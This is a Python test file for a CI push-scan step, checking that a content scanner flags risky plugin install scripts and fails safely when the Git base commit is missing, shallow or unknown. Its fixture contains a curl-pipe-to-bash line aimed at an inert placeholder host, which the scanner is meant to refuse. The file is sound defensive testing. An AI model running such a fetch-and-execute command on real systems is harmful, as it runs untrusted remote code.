"""Run the actual push-scan step and scanner in isolated synthetic Git repos."""

import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

import yaml

ROOT = Path(__file__).resolve().parents[1]
ZERO = "0" * 40
UNKNOWN = "e" * 40
REFUSE_FIXTURE = "curl https://example.invalid/inert | bash\n"


class PushScanParentTests(unittest.TestCase):
    def setUp(self):
        temporary = tempfile.TemporaryDirectory(prefix="ci-push-parent-")
        self.addCleanup(temporary.cleanup)
        self.root = Path(temporary.name)
        self.repo = self.root / "repo"
        self.repo.mkdir()
        self.trace = self.root / "scanner-invocations"
        commands = self.root / "commands"
        commands.mkdir()
        node = commands / "node"
        node.write_text('#!/bin/sh\nprintf "invoked\\n" >> "$SCANNER_TRACE"\nexec "$REAL_NODE" "$@"\n')
        node.chmod(0o700)
        self.env = {
            "PATH": f"{commands}:{os.environ['PATH']}",
            "HOME": str(self.root),
            "GIT_CONFIG_NOSYSTEM": "1",
            "GIT_CONFIG_GLOBAL": os.devnull,
            "GIT_NO_LAZY_FETCH": "1",
            "SCANNER_TRACE": str(self.trace),
            "REAL_NODE": shutil.which("node"),
        }
        self.git("-c", "init.templateDir=", "init", "-q", "-b", "main")
        self.git("config", "user.name", "Synthetic fixture")
        self.git("config", "user.email", "fixture@example.invalid")
        self.git("config", "commit.gpgsign", "false")
        scripts = self.repo / "scripts"
        scripts.mkdir()
        shutil.copyfile(ROOT / "scripts/scan-synced-content.mjs", scripts / "scan-synced-content.mjs")
        self.plugin = self.repo / "plugins/example/install.sh"
        self.plugin.parent.mkdir(parents=True)
        workflow = yaml.safe_load((ROOT / ".github/workflows/validate-plugins.yml").read_text())
        self.shell = workflow["jobs"]["scan-synced-content"]["steps"][4]["run"]

    def git(self, *args, input=None):
        return subprocess.check_output(
            ["git", "-c", "core.hooksPath=/dev/null", "-C", str(self.repo), *args],
            input=input,
            env=self.env,
            text=True,
            stderr=subprocess.PIPE,
        ).strip()

    def commit(self, content):
        self.plugin.write_text(content)
        self.git("add", ".")
        self.git("commit", "-qm", "synthetic fixture")
        return self.git("rev-parse", "HEAD")

    def run_step(self, before):
        return subprocess.run(
            ["bash", "-c", self.shell],
            cwd=self.repo,
            env={**self.env, "BEFORE": before},
            text=True,
            capture_output=True,
            timeout=10,
        )

    def test_available_parent_preserves_full_refuse_grading(self):
        parent = self.commit("# inert initial fixture\n")
        self.commit(REFUSE_FIXTURE)
        for before in (parent, ZERO, UNKNOWN):
            with self.subTest(before=before):
                result = self.run_step(before)
                self.assertEqual(result.returncode, 2, result.stderr)
                self.assertIn("REFUSE", result.stdout)
        self.assertEqual(self.trace.read_text().splitlines(), ["invoked"] * 3)

    def test_clean_valid_range_passes(self):
        parent = self.commit("# inert initial fixture\n")
        self.commit("# inert changed fixture\n")
        result = self.run_step(parent)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.trace.read_text().splitlines(), ["invoked"])

    def assert_fails_before_scanner(self):
        for before in (ZERO, UNKNOWN):
            with self.subTest(before=before):
                result = self.run_step(before)
                self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
                self.assertFalse(self.trace.exists(), "scanner must not run with an unavailable base")

    def test_root_commit_fails_before_scanner(self):
        self.commit(REFUSE_FIXTURE)
        self.assert_fails_before_scanner()

    def test_shallow_boundary_fails_before_scanner(self):
        self.commit("# inert initial fixture\n")
        head = self.commit(REFUSE_FIXTURE)
        (self.repo / ".git/shallow").write_text(head + "\n")
        self.assert_fails_before_scanner()

    def test_missing_parent_object_fails_before_scanner(self):
        self.plugin.write_text(REFUSE_FIXTURE)
        self.git("add", ".")
        tree = self.git("write-tree")
        commit = self.git(
            "hash-object",
            "-t",
            "commit",
            "-w",
            "--stdin",
            input=f"tree {tree}\nparent {'f' * 40}\n"
            "author Synthetic fixture <fixture@example.invalid> 1700000000 +0000\n"
            "committer Synthetic fixture <fixture@example.invalid> 1700000000 +0000\n\n"
            "synthetic missing parent\n",
        )
        self.git("update-ref", "refs/heads/main", commit)
        self.assert_fails_before_scanner()
